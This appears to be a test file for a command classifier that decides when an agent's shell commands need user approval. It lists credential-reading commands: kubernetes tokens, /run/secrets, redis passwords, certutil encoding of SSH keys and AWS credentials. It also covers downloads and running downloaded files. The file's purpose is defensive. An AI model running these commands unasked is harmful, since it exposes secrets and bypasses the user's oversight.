/**
 * Command classes that ran unasked in round eleven's re-rate (commands-remote-r11-*, -c11-*): each test is a table of
 * spellings of one class, with neighbours of each example, and the plain lines beside them that still run. Pure
 * classifier and decision; no Electron. What needs a file the task wrote is in command-flow.test.ts ("programs that run
 * what they are given").
 */

import { describe, expect, it } from "vitest";
import { runCase, type ContextName } from "../fixtures/commands/corpus";
import type { ShellId } from "../../app/main/commands/types";
import { optIs, parseOpts, has, values } from "../../app/main/commands/words";
import { lit } from "../../app/main/commands/words";
import { keptQuestion } from "../../app/main/commands/autopilot";

interface Opts { words?: string; shell?: ShellId; context?: ContextName; downloaded?: string[]; missing?: string[] }
const result = (cmd: string, o: Opts = {}) =>
  runCase({ cmd, verdict: "run", ...(o.words ? { words: o.words } : {}), ...(o.downloaded ? { downloaded: o.downloaded } : {}), ...(o.missing ? { missing: o.missing } : {}) },
    { shell: o.shell ?? "bash", context: o.context ?? "linux" });
const decide = (cmd: string, o: Opts = {}) => result(cmd, o).decision;

describe("a long option written whole that is a prefix of another (commands-remote-r11-2)", () => {
  it("reads curl's --output as the file it saves, never as --output-dir too", () => {
    for (const [cmd, file] of [
      ["curl --output a.py https://x.example/a", "/home/ana/proj/a.py"], ["curl -s https://x.example/a --output a.py", "/home/ana/proj/a.py"],
      ["curl -fsSL --output notes.txt https://x.example/n", "/home/ana/proj/notes.txt"], ["curl --output ~/.bashrc https://x.example/a", "/home/ana/.bashrc"],
      ["curl --output=report.pdf https://x.example/r", "/home/ana/proj/report.pdf"], ["curl --output-dir d --output a.py https://x.example/a", "/home/ana/proj/d/a.py"],
    ] as const) {
      const r = result(cmd);
      expect(r.cls.downloads, cmd).toEqual([file]);
      expect(r.decision.verdict, cmd).toBe("ask");
      expect(r.decision.rules, cmd).toContain("download.output");
      expect(r.decision.reason, cmd).not.toMatch(/\.py\/|\.txt\/|\.pdf\/|bashrc\//);
    }
    // A new file runs as before; running what it saved asks.
    for (const cmd of ["curl --output a.py https://x.example/a", "curl -o a.py https://x.example/a"]) expect(decide(cmd, { missing: ["/home/ana/proj/a.py"] }).verdict, cmd).toBe("run");
    for (const cmd of ["python3 a.py", "bash a.py", "./a.py"]) expect(decide(cmd, { downloaded: ["/home/ana/proj/a.py"] }).rules, cmd).toContain("escape.run-downloaded");
  });

  it("takes a name the table knows whole as that option only, and an abbreviation as any option it may be", () => {
    const p = parseOpts([lit("--output"), lit("a"), lit("--trace"), lit("t"), lit("--prox"), lit("x")], { longValue: ["output", "output-dir", "trace", "trace-ascii", "proxy", "proxy-user"] });
    expect(values(p, "output-dir")).toEqual([]);
    expect(values(p, "output")).toEqual(["a"]);
    expect(values(p, "trace-ascii")).toEqual([]);
    expect(has(p, "trace")).toBe(true);
    expect(optIs("--output", "output-dir", p.long)).toBe(false);
    // An abbreviation of no name the table knows whole still counts as each name it may stand for.
    expect(optIs("--outp", "output-dir", p.long)).toBe(true);
    expect(optIs("--outp", "output", p.long)).toBe(true);
    // Without a table, as before.
    expect(optIs("--output", "output-dir")).toBe(true);
  });

  it("still reads a proxy's password, as main read --proxy by --proxy-user's prefix", () => {
    for (const cmd of ["curl --proxy http://u:pw@proxy:3128 https://x.example", "curl --proxy-user u:pw https://x.example"]) expect(decide(cmd).rules, cmd).toContain("secret.token-arg");
  });
});

describe("output that is a secret by where it comes from (commands-remote-r11-4)", () => {
  it("asks before reading a container's, a service's or a cluster's mounted secrets, in every mode", () => {
    for (const cmd of [
      "cat /run/secrets/db_password", "cat /run/secrets/postgres_password", "cat /var/run/secrets/kubernetes.io/serviceaccount/token", "head -c 100 /run/secrets/x",
      "cat /run/credentials/app.service/db", "base64 /run/secrets/db", "cp /run/secrets/db /tmp/x", "tar czf - /run/secrets", "grep . /run/secrets/*",
      "cat /etc/kubernetes/admin.conf", "cat /etc/rancher/k3s/k3s.yaml", "cat /var/lib/rancher/k3s/server/token", "cat /vault/secrets/config", "cat /etc/ssl/private/site.key",
      "less /etc/credstore/db", "xxd /run/keys/x",
    ]) {
      const r = result(cmd);
      expect(r.decision.verdict, cmd).toBe("ask");
      expect(r.decision.rules, cmd).toContain("path.secret");
      expect(keptQuestion(r.decision, r.cls.findings), cmd).toBe("secret");
    }
    expect(decide("Get-Content C:\\ProgramData\\Docker\\secrets\\db", { shell: "powershell", context: "win32" }).rules).toContain("path.secret");
    // Listing the folder still runs.
    for (const cmd of ["ls /run/secrets", "ls -la /var/run/secrets/kubernetes.io/serviceaccount"]) expect(decide(cmd).verdict, cmd).toBe("run");
  });

  it("asks before redis-cli prints a password, a pattern of settings, its users or a key named like a secret", () => {
    for (const cmd of [
      "redis-cli CONFIG GET requirepass", "redis-cli -h prod CONFIG GET '*'", "redis-cli config get masterauth", "redis-cli CONFIG GET '*pass*'", "redis-cli CONFIG GET tls-key-file-pass",
      "redis-cli CONFIG GET maxmemory requirepass", "redis-cli ACL LIST", "redis-cli ACL GETUSER default", "redis-cli AUTH hunter2 PING", "redis-cli HELLO 3 AUTH default hunter2",
      "redis-cli GET api_token", "redis-cli GET session:abc", "redis-cli HGETALL user:1:credentials", "redis-cli MGET a db_password", "redis-cli GET \"$KEY\"",
    ]) {
      const r = result(cmd);
      expect(r.decision.verdict, cmd).toBe("ask");
      expect(r.decision.rules, cmd).toContain("secret.db");
      expect(keptQuestion(r.decision, r.cls.findings), cmd).toBe("secret");
    }
    // Ordinary reads still run, and ACL's lists that print no password aren't a change.
    for (const cmd of ["redis-cli PING", "redis-cli GET counter", "redis-cli CONFIG GET maxmemory", "redis-cli INFO", "redis-cli ACL WHOAMI", "redis-cli ACL USERS"]) {
      expect(decide(cmd).verdict, cmd).toBe("run");
    }
  });
});

describe("Windows certutil's file verbs (commands-remote-c11-1)", () => {
  const PS = { shell: "powershell" as const, context: "win32" as const };
  const CMD = { shell: "cmd" as const, context: "win32" as const };

  it("asks before it encodes or dumps a secret, overwrites a file or writes to a share, as copy does", () => {
    for (const [cmd, rule, o] of [
      ["certutil -encode ~\\.ssh\\id_rsa out.txt", "path.secret", PS], ["certutil -encodehex ~\\.ssh\\id_rsa out.txt", "path.secret", PS],
      ["certutil -dump ~\\.ssh\\id_rsa", "path.secret", PS], ["certutil -encode C:\\Users\\ana\\.aws\\credentials o.txt", "path.secret", PS],
      ["certutil -encode %USERPROFILE%\\.ssh\\id_rsa o.txt", "path.secret", CMD], ["certutil /encode %USERPROFILE%\\.ssh\\id_rsa o.txt", "path.secret", CMD],
      ["certutil -f -decode in.b64 report.docx", "certutil.output", PS], ["certutil -decodehex in.hex report.docx", "certutil.output", PS],
      ["certutil -f -decode in.b64 ~\\Documents\\old\\a.docx", "certutil.output", PS], ["certutil -encode report.docx \\\\x.example\\share\\r.txt", "upload.unc", PS],
      ["certutil -v -encode ~\\.ssh\\id_rsa o.txt", "path.secret", PS], ["certutil -frobnicate x", "unclear.option-value", PS], ["certutil -decode in.b64 /tmp/x", "unclear.option-value", PS],
    ] as const) {
      const d = decide(cmd, o);
      expect(d.verdict, cmd).toBe("ask");
      expect(d.rules, cmd).toContain(rule);
    }
    // Hashing, listing a store and encoding into a new file still run.
    for (const cmd of ["certutil -hashfile a.zip SHA256", "certutil -store my", "certutil -encode a.txt b.txt"]) expect(decide(cmd, { ...PS, missing: ["C:\\Users\\ana\\proj\\b.txt"] }).verdict, cmd).toBe("run");
  });
});
